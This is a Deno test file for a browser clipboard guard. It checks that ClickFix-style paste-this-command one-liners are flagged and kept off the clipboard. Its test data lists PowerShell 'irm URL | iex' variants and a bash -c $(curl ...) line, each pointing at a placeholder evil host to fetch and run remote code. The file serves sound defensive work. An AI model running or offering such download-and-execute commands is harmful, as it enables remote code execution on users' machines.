// Clipboard guard: common ClickFix one-liners for Windows Terminal (PowerShell
// pipeline form "irm URL | iex") and macOS ("bash -c "$(curl ...)"") must be
// recognised as dangerous, and a page's writeText of them must not reach the
// clipboard on an ordinary (non-docs) host.
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";
function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };

const CMDS = [
  "irm https://evil.test/a | iex",
  "iwr https://evil.test/a.ps1 -UseBasicParsing | iex",
  "Invoke-RestMethod https://evil.test/a | Invoke-Expression",
  "/bin/bash -c \"$(curl -fsSL https://evil.test/install.sh)\"",
];

Deno.test("matchDangerous flags pipeline-form PowerShell and bash -c $(curl) one-liners", () => {
  const g = loadClip();
  const missed = CMDS.filter((s) => !g.matchDangerous(s));
  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
});

Deno.test("writeText of 'irm URL | iex' on an ordinary host does not reach the clipboard", async () => {
  const written = [];
  class Clipboard { writeText(x) { written.push(x); return Promise.resolve(); } write() { return Promise.resolve(); } }
  const clipboard = new Clipboard();
  class Document { execCommand() { return true; } }
  const document = new Document();
  document.addEventListener = () => {};
  document.activeElement = null;
  class DataTransfer { setData() {} }
  class Selection { toString() { return ""; } }
  class Blob {}
  class ClipboardItem {}
  const window = { getSelection: () => new Selection(), Selection, DataTransfer, Document, Blob, ClipboardItem };
  const g = loadClip();
  g.install({ window, document, navigator: { clipboard }, location: { hostname: "evil.example" }, now: () => 1000, notify: () => {}, flagOn: () => true });
  for (const c of CMDS) await clipboard.writeText(c).catch(() => {});
  const leaked = CMDS.filter((c) => written.includes(c));
  assert(leaked.length === 0, "reached the clipboard: " + JSON.stringify(leaked));
});
